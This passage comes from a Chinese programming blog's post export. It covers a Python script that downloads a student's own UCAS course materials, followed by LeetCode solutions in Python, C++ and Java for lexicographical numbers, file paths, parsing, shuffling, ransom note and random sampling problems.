在下载模块中，使用的是多线程，在多线程中，需要注意创建文件夹路径不存在时进行创建需要加锁。 对于已经存在的文件，这不要进行下载了 验证码的识别（2017.2更新，多了验证码） 可以参考本博客 验证码简介 以及用tesseract -OCR识别验证码 进入第二学期后，只查看第二学期的课程（学期的概念） 此外，还用PyInstaller打包成了exe文件。 Code 代码如下：完整代码以及后续更新请见github: UCAS 课件自动下载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154# -*- coding: utf-8 -*-# @Date : 2016/9/9# @Author : hrwhisperimport codecsimport reimport osimport multiprocessingfrom multiprocessing.dummy import Poolfrom datetime import datetimeimport urllib.parseimport requestsfrom bs4 import BeautifulSoupdef read_file(): with codecs.open(r&#x27;./private&#x27;, &quot;r&quot;, &quot;utf-8&quot;) as f: res = f.read().split(&quot;\\n&quot;) username, password, save_path = res return username, password, save_pathclass Ucas(object): username, password, save_base_path = read_file() def __init__(self, time_out=10): self.__BEAUTIFULSOUPPARSE = &#x27;html5lib&#x27; # or use &#x27;lxml&#x27; self.session = requests.session() self.headers = &#123; &quot;Host&quot;: &quot;sep.ucas.ac.cn&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, sdch&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4&quot;, &#125; self.course_list = [] self.to_download = [] self.lock = multiprocessing.Lock() self._time_out = time_out def _login_sep(self): # 登录sep print(&#x27;Login....&#x27;) url = &quot;http://sep.ucas.ac.cn/slogin&quot; post_data = &#123; &quot;userName&quot;: self.username, &quot;pwd&quot;: self.password, &quot;sb&quot;: &quot;sb&quot; &#125; html = self.session.post(url, data=post_data, headers=self.headers).text result = BeautifulSoup(html, self.__BEAUTIFULSOUPPARSE).find(&#x27;div&#x27;, class_=&#x27;alert alert-error&#x27;) if result: raise ValueError(&#x27;用户名或者密码错误&#x27;) def _get_course_page(self): # 从sep中获取Identity Key来登录课程系统，并获取课程信息 url = &quot;http://sep.ucas.ac.cn/portal/site/16/801&quot; r = self.session.get(url, headers=self.headers) code = re.findall(r&#x27;&quot;http://course.ucas.ac.cn/portal/plogin\\?Identity=(.*)&quot;&#x27;, r.text)[0] url = &quot;http://course.ucas.ac.cn/portal/plogin?Identity=&quot; + code self.headers[&#x27;Host&#x27;] = &quot;course.ucas.ac.cn&quot; html = self.session.get(url, headers=self.headers).text url = &#x27;http://course.ucas.ac.cn&#x27; + \\ BeautifulSoup(html, self.__BEAUTIFULSOUPPARSE).find(&#x27;frame&#x27;, title=&#x27;mainFrame&#x27;)[&#x27;src&#x27;] html = self.session.get(url, headers=self.headers).text url = BeautifulSoup(html, self.__BEAUTIFULSOUPPARSE).find(&#x27;a&#x27;, class_=&#x27;icon-sakai-membership&#x27;)[&#x27;href&#x27;] html = self.session.get(url, headers=self.headers).text url = BeautifulSoup(html, self.__BEAUTIFULSOUPPARSE).find(&#x27;iframe&#x27;)[&#x27;src&#x27;] html = self.session.get(url, headers=self.headers).text return html def _parse_course_list(self): # 获取课程的所有URL html = self._get_course_page() self.course_list = [&#x27;http://course.ucas.ac.cn/portal/site/&#x27; + x for x in re.findall(r&#x27;http://course.ucas.ac.cn/portal/site/([\\S]+)&quot;&#x27;, html)] def _get_all_resource_url(self): # 从课程的所有URL中获取对应的所有课件 print(&#x27;读取课件中......&#x27;) base_url = &#x27;http://course.ucas.ac.cn/access/content/group/&#x27; urls = [base_url + x.split(&#x27;/&#x27;)[-1] + &#x27;/&#x27; for x in self.course_list] list(map(self._get_resource_url, urls)) def _get_resource_url(self, base_url, _path=&#x27;&#x27;, source_name=None): html = self.session.get(base_url, headers=self.headers).text tds = BeautifulSoup(html, self.__BEAUTIFULSOUPPARSE).find_all(&#x27;td&#x27;) if not source_name: source_name = BeautifulSoup(html, self.__BEAUTIFULSOUPPARSE).find(&#x27;h2&#x27;).text res = set() for td in tds: url = td.find(&#x27;a&#x27;) if not url: continue url = urllib.parse.unquote(url[&#x27;href&#x27;]) if url == &#x27;../&#x27;: continue if &#x27;Folder&#x27; in td.text: # directory self._get_resource_url(base_url + url, _path + &#x27;/&#x27; + url, source_name) if url.startswith(&#x27;http:__&#x27;): # Fix can&#x27;t download when given a web link. eg: 计算机算法分析与设计 try: res.add((self.session.get(base_url + url, headers=self.headers, timeout=self._time_out).url, _path)) except requests.exceptions.ReadTimeout: print(&quot;Error-----------: &quot;, base_url + url, &quot;添加进下载路径失败,服务器长时间无响应&quot;) else: res.add((base_url + url, _path)) for url, _path in res: self.to_download.append((source_name, _path, url)) def _start_download(self): # 多线程下载 p = Pool() p.map(self._download_file, self.to_download) p.close() p.join() def _download_file(self, param): # 下载文件 dic_name, sub_directory, url = param save_path = self.save_base_path + &#x27;/&#x27; + dic_name + &#x27;/&#x27; + sub_directory if self.lock.acquire(): if not os.path.exists(save_path): # To create directory os.makedirs(save_path) self.lock.release() filename = url.split(&#x27;/&#x27;)[-1] save_path += &#x27;/&#x27; + filename if not os.path.exists(save_path): # To prevent download exists files try: r = self.session.get(url, stream=True, timeout=self._time_out) except requests.exceptions.ReadTimeout as e: print(&#x27;Error-----------文件下载失败,服务器长时间无响应: &#x27;, save_path) size_mb = int(r.headers.get(&#x27;Content-Length&#x27;)) / (1024 ** 2) print(&#x27;Start download &#123;dic_name&#125; &gt;&gt; &#123;sub_directory&#125;&#123;filename&#125; &#123;size_mb:.2f&#125;MB&#x27;.format(**locals())) with open(save_path, &#x27;wb&#x27;) as f: for chunk in r.iter_content(chunk_size=1024): if chunk: # filter out keep-alive new chunks f.write(chunk) f.flush() print(&#x27;&#123;dic_name&#125; &gt;&gt; &#123;sub_directory&#125;&#123;filename&#125; Download success&#x27;.format(**locals())) def start(self): try: self._login_sep() self._parse_course_list() self._get_all_resource_url() self._start_download() except ValueError as e: print(e, &#x27;请检查private文件&#x27;)if __name__ == &#x27;__main__&#x27;: start = datetime.now() s = Ucas() s.start() print(&#x27;Task complete, total time:&#x27;, datetime.now() - start) os.system(&quot;pause&quot;)","categories":[{"name":"技术改变生活","slug":"技术改变生活","permalink":"https://www.hrwhisper.me/categories/%E6%8A%80%E6%9C%AF%E6%94%B9%E5%8F%98%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://www.hrwhisper.me/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"leetcode contest 1 solution","slug":"leetcode-contest-1-solution","date":"2016-08-21T06:20:41.000Z","updated":"2021-01-08T13:32:16.830Z","comments":true,"path":"leetcode-contest-1-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-contest-1-solution/","excerpt":"The problems contains: Lexicographical Numbers First Unique Character in a String Longest Absolute File Path","text":"The problems contains: Lexicographical Numbers First Unique Character in a String Longest Absolute File Path 386. Lexicographical Numbers Given an integer n, return 1 - n in lexicographical order. For example, given 13, return: [1,10,11,12,13,2,3,4,5,6,7,8,9]. Please optimize your algorithm to use less time and space. The input size may be as large as 5,000,000. 题目地址：leetcode Lexicographical Numbers 题意：给定整数n，返回1~n的所有数字组成的集合，要求按照字典的顺序 思路：写一个生成器即可。比如1的我们就试试10 100这样 12345678910111213141516171819202122class Solution(object): def lexicalOrder(self, n): &quot;&quot;&quot; :type n: int :rtype: List[int] &quot;&quot;&quot; if n &lt; 1: return [] res = [] for first in xrange(1, 10): if first &gt; n: break res.append(first) self.get_all_number(first,n,res) return res def get_all_number(self, first, n, res): for i in xrange(10): t = first * 10 + i if t &lt;= n: res.append(t) self.get_all_number(t, n, res) else: break 387. First Unique Character in a String Given a string, find the first non-repeating character in it and return it's index. If it doesn't exist, return -1. Examples: 12345s &#x3D; &quot;leetcode&quot;return 0.s &#x3D; &quot;loveleetcode&quot;,return 2. Note: You may assume the string contain only lowercase letters. 题目地址：leetcode First Unique Character in a String 题意：给定一个仅由小写字母组成的字符串，寻找第一个只在字符串中出现的字母的下标 思路：水。 我懒得自己写26大小的数组来统计了。直接Counter类。 毕竟要看女排 →_→ 1234567891011class Solution(object): def firstUniqChar(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; x = collections.Counter(s) for i, c in enumerate(s): if x[c] == 1: return i return -1 388. Longest Absolute File Path Suppose we abstract our file system by a string in the following manner: The string \"dir\\n\\tsubdir1\\n\\tsubdir2\\n\\t\\tfile.ext\" represents: 1234dir subdir1 subdir2 file.ext The directory dir contains an empty sub-directory subdir1 and a sub-directory subdir2 containing a file file.ext. The string \"dir\\n\\tsubdir1\\n\\t\\tfile1.ext\\n\\t\\tsubsubdir1\\n\\tsubdir2\\n\\t\\tsubsubdir2\\n\\t\\t\\tfile2.ext\" represents: 1234567dir subdir1 file1.ext subsubdir1 subdir2 subsubdir2 file2.ext The directory dir contains two sub-directories subdir1 and subdir2. subdir1 contains a file file1.ext and an empty second-level sub-directory subsubdir1. subdir2 contains a second-level sub-directory subsubdir2 containing a file file2.ext. We are interested in finding the longest (number of characters) absolute path to a file within our file system. For example, in the second example above, the longest absolute path is\"dir/subdir2/subsubdir2/file2.ext\", and its length is 32 (not including the double quotes). Given a string representing the file system in the above format, return the length of the longest absolute path to file in the abstracted file system. If there is no file in the system, return0. Note: The name of a file contains at least a . and an extension. The name of a directory or sub-directory will not contain a .. Time complexity required: O(n) where n is the size of the input string. Notice that a/aa/aaa/file1.txt is not the longest file path, if there is another path aaaaaaaaaaaaaaaaaaaaa/sth.png. 题目地址：leetcode Longest Absolute File Path 题意：给定一串路径，求最长的文件路径。 思路： 这题大概就是记录一下上一层目录在哪结尾的，换新的目录就替换一下。(t_cnt为)，当然这个过程也可以用栈来做。 注意，一定是要文件！目录不行！ 下面是我当时为了看女排比赛写的代码，没有优化- - 1234567891011121314151617181920212223242526272829303132333435363738394041class Solution(object): def lengthLongestPath(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; t_cnt = collections.defaultdict(int) t_cnt[0] = ans = last_t_cnt = cur_t_cnt = 0 cur_path = &#x27;&#x27; is_file = False while s: n = len(s) index = s.find(&#x27;\\n&#x27;) if cur_t_cnt &lt;= last_t_cnt: cur_path = cur_path[:t_cnt[cur_t_cnt]] t_cnt[cur_t_cnt] = len(cur_path) if cur_t_cnt != 0: cur_path += &#x27;/&#x27; if index != -1: next_t_cnt = 0 for i in xrange(index + 1, n): if s[i] == &#x27;\\t&#x27;: next_t_cnt += 1 else: break cur_s = s[:index] is_file = cur_s.find(&#x27;.&#x27;) != -1 cur_path += s[:index] s = s[1 + next_t_cnt + index:] last_t_cnt, cur_t_cnt = cur_t_cnt, next_t_cnt else: cur_path += s is_file = s.find(&#x27;.&#x27;) != -1 s = None if is_file: ans = max(ans, len(cur_path)) return ans 上述的模拟过程可以用如下的代码替代(并且不用构造串，直接记录长度)，比我的简洁太多 Orz 一下 StefanPochmann 123456789101112class Solution(object): def lengthLongestPath(self, input): maxlen = 0 pathlen = &#123;0: 0&#125; for line in input.splitlines(): name = line.lstrip(&#x27;\\t&#x27;) depth = len(line) - len(name) if &#x27;.&#x27; in name: maxlen = max(maxlen, pathlen[depth] + len(name)) else: pathlen[depth + 1] = pathlen[depth] + len(name) + 1 return maxlen 本次是下面几道题的题解 leetcode 386. Lexicographical Numbers leetcode 387. First Unique Character in a String leetcode 388. Longest Absolute File Path 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Mini Parser","slug":"leetcode-mini-parser","date":"2016-08-14T14:04:46.000Z","updated":"2021-01-08T13:32:16.855Z","comments":true,"path":"leetcode-mini-parser/","link":"","permalink":"https://www.hrwhisper.me/leetcode-mini-parser/","excerpt":"leetcode Mini Parser Given a nested list of integers represented as a string, implement a parser to deserialize it. Each element is either an integer, or a list -- whose elements may also be integers or other lists. Note: You may assume that the string is well-formed: String is non-empty. String does not contain white spaces. String contains only digits 0-9, [, ,, ]. Example 1: 123Given s &#x3D; &quot;324&quot;,You should return a NestedInteger object which contains a single integer 324. Example 2: 123456789Given s &#x3D; &quot;[123,[456,[789]]]&quot;,Return a NestedInteger object containing a nested list with 2 elements:1. An integer containing value 123.2. A nested list containing two elements: i. An integer containing value 456. ii. A nested list with one element: a. An integer containing value 789.","text":"leetcode Mini Parser Given a nested list of integers represented as a string, implement a parser to deserialize it. Each element is either an integer, or a list -- whose elements may also be integers or other lists. Note: You may assume that the string is well-formed: String is non-empty. String does not contain white spaces. String contains only digits 0-9, [, ,, ]. Example 1: 123Given s &#x3D; &quot;324&quot;,You should return a NestedInteger object which contains a single integer 324. Example 2: 123456789Given s &#x3D; &quot;[123,[456,[789]]]&quot;,Return a NestedInteger object containing a nested list with 2 elements:1. An integer containing value 123.2. A nested list containing two elements: i. An integer containing value 456. ii. A nested list with one element: a. An integer containing value 789. 题目地址：leetcode Mini Parser 题意：给定一个字符串，要求把它解析成NestedInteger 类型 思路： 第3个A此题 怀疑前两个是出题的人自己测试的= = 本来发了discuss 想想还是只发blog吧~ 本题的NestedInteger结构 和341. Flatten Nested List Iterator 类似 由于没有空格，所以第一个字母不是'['的说明只有一个数字。直接返回NestedInteger(int(s)) 接下来，用一个栈来维护，对于左括号[的，当前的NestedInteger 进栈，对于右括号，当前数字放入NestedInteger 栈不为空则把栈顶的NestedInteger添加当前的NestedInteger，并且出栈。 此外，注意‘-’的情况 1234567891011121314151617181920212223242526272829class Solution(object): def deserialize(self, s): &quot;&quot;&quot; :type s: str :rtype: NestedInteger &quot;&quot;&quot; if s[0] != &#x27;[&#x27;: return NestedInteger(int(s)) stack = [] n = len(s) cur = minus = num = None for i in xrange(n): if s[i] == &#x27;[&#x27;: if cur is not None: stack.append(cur) cur = NestedInteger() elif s[i] in [&#x27;]&#x27;, &#x27;,&#x27;]: if num is not None: if minus: num *= -1 cur.add(num) if s[i] == &#x27;]&#x27; and stack: stack[-1].add(cur) cur = stack.pop() minus = num = None elif s[i] == &#x27;-&#x27;: minus = True else: if num is None: num = 0 num = num * 10 + ord(s[i]) - 48 return cur 本题是leetcode 385 Mini Parser 的题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Shuffle an Array","slug":"leetcode-shuffle-array","date":"2016-08-12T01:57:34.000Z","updated":"2021-01-08T13:32:16.867Z","comments":true,"path":"leetcode-shuffle-array/","link":"","permalink":"https://www.hrwhisper.me/leetcode-shuffle-array/","excerpt":"leetcode Shuffle an Array Shuffle a set of numbers without duplicates. Example: 1234567891011121314&#x2F;&#x2F; Init an array with set 1, 2, and 3.int[] nums &#x3D; &#123;1,2,3&#125;;Solution solution &#x3D; new Solution(nums);&#x2F;&#x2F; Shuffle the array [1,2,3] and return its result. Any permutation of [1,2,3] must equally likely to be returned.solution.shuffle();&#x2F;&#x2F; Resets the array back to its original configuration [1,2,3].solution.reset();&#x2F;&#x2F; Returns the random shuffling of array [1,2,3].solution.shuffle();","text":"leetcode Shuffle an Array Shuffle a set of numbers without duplicates. Example: 1234567891011121314&#x2F;&#x2F; Init an array with set 1, 2, and 3.int[] nums &#x3D; &#123;1,2,3&#125;;Solution solution &#x3D; new Solution(nums);&#x2F;&#x2F; Shuffle the array [1,2,3] and return its result. Any permutation of [1,2,3] must equally likely to be returned.solution.shuffle();&#x2F;&#x2F; Resets the array back to its original configuration [1,2,3].solution.reset();&#x2F;&#x2F; Returns the random shuffling of array [1,2,3].solution.shuffle(); 题目地址：leetcode Shuffle an Array 题意：给定一个数组，实现两个接口 reset() 和 shuffle()， 前者为置位返回初始的数组，后者为随机化数组。 思路：用swap，每次从[i,n-1]中随机一个数，和第i个数交换即可。 Python code如下： 12345678910111213141516171819202122232425262728class Solution(object): def __init__(self, nums): &quot;&quot;&quot; :type nums: List[int] :type size: int &quot;&quot;&quot; self.nums = nums self.output = nums[:] def reset(self): &quot;&quot;&quot; Resets the array to its original configuration and return it. :rtype: List[int] &quot;&quot;&quot; self.output = self.nums[:] return self.nums def shuffle(self): &quot;&quot;&quot; Returns a random shuffling of the array. :rtype: List[int] &quot;&quot;&quot; n = len(self.output) for i in xrange(n): _id = random.randint(i, n - 1) self.output[i], self.output[_id] = self.output[_id], self.output[i] return self.output 当然，上面的代码是每次洗牌从上一次的结果继续进行的，这也符合我们对于洗牌的感觉。 如果每次从初始数组进行洗牌，那么reset数组只需要返回初始数组。。 123456789101112131415161718192021222324252627class Solution(object): def __init__(self, nums): &quot;&quot;&quot; :type nums: List[int] :type size: int &quot;&quot;&quot; self.nums = nums def reset(self): &quot;&quot;&quot; Resets the array to its original configuration and return it. :rtype: List[int] &quot;&quot;&quot; return self.nums def shuffle(self): &quot;&quot;&quot; Returns a random shuffling of the array. :rtype: List[int] &quot;&quot;&quot; output = self.nums[:] n = len(output) for i in xrange(n): _id = random.randint(i,n-1) output[i],output[_id] = output[_id],output[i] return output 其他的代码： C++ 123456789101112131415161718192021class Solution &#123; vector&lt;int&gt; nums; vector&lt;int&gt; output;public: Solution(vector&lt;int&gt; nums) :nums(nums),output(nums) &#123;&#125; /** Resets the array to its original configuration and return it. */ vector&lt;int&gt; reset() &#123; return output = nums; &#125; /** Returns a random shuffling of the array. */ vector&lt;int&gt; shuffle() &#123; int n = output.size(); for (int i = 0; i &lt; n; i++) &#123; int _id = rand() % (n - i); swap(output[i], output[i + _id]); &#125; return output; &#125;&#125;; Java 12345678910111213141516171819202122232425262728public class Solution &#123; private int[] nums; private int[] output; private Random random; public Solution(int[] nums) &#123; this.nums = nums; this.output = Arrays.copyOf(nums,nums.length); this.random = new Random(); &#125; /** Resets the array to its original configuration and return it. */ public int[] reset() &#123; return this.output = Arrays.copyOf(nums,nums.length); &#125; /** Returns a random shuffling of the array. */ public int[] shuffle() &#123; int n = output.length; for (int i = 0; i &lt; n; i++) &#123; int _id = random.nextInt(n-i); int temp = output[i]; output[i] = output[i+_id]; output[i+_id] = temp; &#125; return output; &#125;&#125; 本题是leetcode 384 Shuffle an Array 的题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Ransom Note","slug":"leetcode-ransom-note","date":"2016-08-11T03:35:05.000Z","updated":"2021-01-08T13:38:48.015Z","comments":true,"path":"leetcode-ransom-note/","link":"","permalink":"https://www.hrwhisper.me/leetcode-ransom-note/","excerpt":"leetcode Ransom Note Given an arbitrary ransom note string and another string containing letters from all the magazines, write a function that will return true if the ransom note can be constructed from the magazines ; otherwise, it will return false. Each letter in the magazine string can only be used once in your ransom note. Note: You may assume that both strings contain only lowercase letters. 123canConstruct(&quot;a&quot;, &quot;b&quot;) -&gt; falsecanConstruct(&quot;aa&quot;, &quot;ab&quot;) -&gt; falsecanConstruct(&quot;aa&quot;, &quot;aab&quot;) -&gt; true","text":"leetcode Ransom Note Given an arbitrary ransom note string and another string containing letters from all the magazines, write a function that will return true if the ransom note can be constructed from the magazines ; otherwise, it will return false. Each letter in the magazine string can only be used once in your ransom note. Note: You may assume that both strings contain only lowercase letters. 123canConstruct(&quot;a&quot;, &quot;b&quot;) -&gt; falsecanConstruct(&quot;aa&quot;, &quot;ab&quot;) -&gt; falsecanConstruct(&quot;aa&quot;, &quot;aab&quot;) -&gt; true 题目地址：leetcode Ransom Note 题目大意：给定两个字符串magazines和ransomNote，问是否可以从magazines中抽取字母（每个字母只能用一次）组成ransomNote 思路：只要判断ransomNote字符是不是全部在magazines中即可，用hash。。 水 C++ 123456789class Solution &#123;public: bool canConstruct(string ransomNote, string magazine) &#123; vector&lt;int&gt; cnt(26,0); for(char x:magazine) cnt[x-97]++; for(char x:ransomNote) if(--cnt[x-97] &lt; 0) return false; return true; &#125;&#125;; Java 12345678public class Solution &#123; public boolean canConstruct(String ransomNote, String magazine) &#123; int[] cnt = new int[26]; for (int i = 0; i &lt; magazine.length(); i++) cnt[magazine.charAt(i) - 97]++;for (int i = 0; i &lt; ransomNote.length(); i++) if (--cnt[ransomNote.charAt(i) - 97] &lt; 0) return false;return true; &#125;&#125; Python 123456789101112class Solution(object): def canConstruct(self, ransomNote, magazine): &quot;&quot;&quot; :type ransomNote: str :type magazine: str :rtype: bool &quot;&quot;&quot; cnt = collections.Counter(magazine) for letter in ransomNote: cnt[letter] -= 1 if cnt[letter] &lt;0: return False return True 本题是leetcode 383 Ransom Note 的题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode 随机采样","slug":"leetcode-random-sample-from-array-or-linked-list","date":"2016-08-10T02:10:01.000Z","updated":"2021-01-08T13:32:16.859Z","comments":true,"path":"leetcode-random-sample-from-array-or-linked-list/","link":"","permalink":"https://www.hrwhisper.me/leetcode-random-sample-from-array-or-linked-list/","excerpt":"本文包括 Linked List Random Node 528. Random Pick with Weight 蓄水池抽样","text":"本文包括 Linked List Random Node 528. Random Pick with Weight 蓄水池抽样 382. Linked List Random Node Given a singly linked list, return a random node's value from the linked list. Each node must have the same probability of being chosen. Follow up: What if the linked list is extremely large and its length is unknown to you? Could you solve this efficiently without using extra space? Example: 12345678// Init a singly linked list [1,2,3].ListNode head = new ListNode(1);head.next = new ListNode(2);head.next.next = new ListNode(3);Solution solution = new Solution(head);// getRandom() should return either 1, 2, or 3 randomly. Each element should have equal probability of returning.solution.getRandom(); 题目地址: leetcode Linked List Random Node 题意: 给定一个链表，要求以相等的概率返回链表上的结点。 思路： 若已知链表长度len，那么直接随机一下0~len-1，然后遍历到那个结点。 如果不知道长度呢？ 我们实时的计算当前遍历了多少个元素cnt，然后以 1/cnt 的概率选择 当前的元素，直到遍历完链表。 这样遍历一遍即可。 为啥是对的？ 我们以第2个数为例（就是head.next.val） 选取的概率为(1/2)* （2/3）（3/4） ........... (n-1) / n = 1/n （选取第2个数在长度为2的时候为1/2，其他的都不要选) 而对于任意的第x数，由于可以覆盖前面的数，均有：\\(\\frac{1}{x}\\times \\frac{x}{x+1} \\times ... \\times \\frac{n-1}{n} = \\frac{1}{n}\\) 第n个数就直接1/n啦 大家都是1/n~ C++ 1234567891011121314class Solution &#123; ListNode *head;public: /** @param head The linked list&#x27;s head. Note that the head is guanranteed to be not null, so it contains at least one node. */ Solution(ListNode* head) :head(head) &#123;&#125; /** Returns a random node&#x27;s value. */ int getRandom() &#123; int ans = 0; ListNode *p = head; for (int cnt = 1; p; cnt++, p = p-&gt;next) if (rand() % cnt == 0) ans = p-&gt;val; return ans; &#125;&#125;; Java 123456789101112131415161718import java.util.Random;public class Solution &#123; private ListNode head; private Random random; /** @param head The linked list&#x27;s head. Note that the head is guanranteed to be not null, so it contains at least one node. */ public Solution(ListNode head) &#123; this.head = head; this.random = new Random(); &#125; /** Returns a random node&#x27;s value. */ public int getRandom() &#123; int ans = 0; ListNode p = head; for (int cnt = 1; p != null; cnt++, p = p.next) if (random.nextInt(cnt) == 0) ans = p.val; return ans; &#125;&#125; Python 注：在代码实现上，这里的cnt 比上面讲解中的cnt 少1 randint(x,y)返回的为[x,y]的闭区间。 12345678910111213141516171819202122import randomclass Solution(object): def __init__(self, head): &quot;&quot;&quot; @param head The linked list&#x27;s head. Note that the head is guanranteed to be not null, so it contains at least one node. :type head: ListNode &quot;&quot;&quot; self.head = head def getRandom(self): &quot;&quot;&quot; Returns a random node&#x27;s value. :rtype: int &quot;&quot;&quot; ans = cnt = 0 head = self.head while head: if random.randint(0, cnt) == 0: ans = head.val head, cnt = head.next, cnt + 1 return ans 528. Random Pick with Weight Given an array w of positive integers, where w[i] describes the weight of index i, write a function pickIndex which randomly picks an index in proportion to its weight. Note: 1 &lt;= w.length &lt;= 10000 1 &lt;= w[i] &lt;= 10^5 pickIndex will be called at most 10000 times. Example 1: 1234Input:[&quot;Solution&quot;,&quot;pickIndex&quot;][[[1]],[]]Output: [null,0] Example 2: 1234Input:[&quot;Solution&quot;,&quot;pickIndex&quot;,&quot;pickIndex&quot;,&quot;pickIndex&quot;,&quot;pickIndex&quot;,&quot;pickIndex&quot;][[[1,3]],[],[],[],[],[]]Output: [null,0,1,1,1,0] 题目地址: leetcode Random Pick with Weight 题意: 给定一个数组表示下标对应的权重，要求按这个权重数组随机的抽样。（抽样的概率和权重成正比） 思路： 假设没有权重的时候给定n个数就只需要从这n个数随机抽一个即可，每个的概率是1/n。 那么有权重的时候的区别是什么呢？权重为w其实可以看成一个数重复w次，这样随机抽取，抽到的概率就是1/所有权重之和，由于一个数重复w次，因此一个数被抽到就是w/所有权重之和。 代码实现上，可以算到当前数的权重和，然后用二分查找。 Python 1234567891011121314151617181920212223242526import randomclass Solution: def __init__(self, w: List[int]): self.sum = [] for x in w: if self.sum: self.sum.append(self.sum[-1] + x) else: self.sum.append(x) def pickIndex(self) -&gt; int: if not self.sum: return 0 L, R = 0, len(self.sum) - 1 target = random.randint(1, self.sum[-1]) while L &lt; R: mid = (L + R) &gt;&gt; 1 if target == self.sum[mid]: return mid if self.sum[mid] &lt; target: L = mid + 1 else: R = mid return L 蓄水池抽样 如果要从n个数中，等概率的抽取k个数呢？ 这是蓄水池抽样算法，伪代码如下 12345678910given k;i &#x3D; 1for num in nums: if i &lt;&#x3D; k: continue temp &#x3D; random.randint(0, i) if temp &lt; k: swap(nums[i], nums[temp]) i +&#x3D; 1return nums[:k] 即个数&lt;k的时候直接放入，当做水池。 从k + 1开始，第i个数，每个数以 k / i的概率被选中，并随机的替换蓄水池的k个数中的一个，这样每个数的概率都是k / n 证明如下： 第i个数(i &gt; k)最后被选中的概率 = 第i个数时以概率 k / i被选中，之后的数不被选中或者选中的不替换第i个数 \\[ \\frac{k}{i} * [(1- \\frac{k}{i + 1} + \\frac{k}{i + 1}\\times\\frac{k-1}{k}) \\times (1- \\frac{k}{i + 2} + \\frac{k}{i + 2}\\times\\frac{k-1}{k})\\times... \\times (1- \\frac{k}{n} + \\frac{k}{n}\\times\\frac{k-1}{k})] \\\\= \\frac{k}{i} \\times (\\frac{i}{i + 1} \\times \\frac{i + 1}{i + 2} \\times ... \\times \\frac{n - 1}{n} ) = \\frac{k}{n} \\] 而对于前k个数，类似的也有 \\[ (1- \\frac{k}{k + 1} + \\frac{k}{k + 1}\\times\\frac{k-1}{k}) \\times (1- \\frac{k}{k + 2} + \\frac{k}{k + 2}\\times\\frac{k-1}{k})\\times... \\times (1- \\frac{k}{n} + \\frac{k}{n}\\times\\frac{k-1}{k}) \\\\= \\frac{k}{k + 1} \\times \\frac{k + 1}{k + 2} \\times ... \\times \\frac{n - 1}{n} = \\frac{k}{n} \\] 本题是leetcode 382 Linked List Random Node 的题解 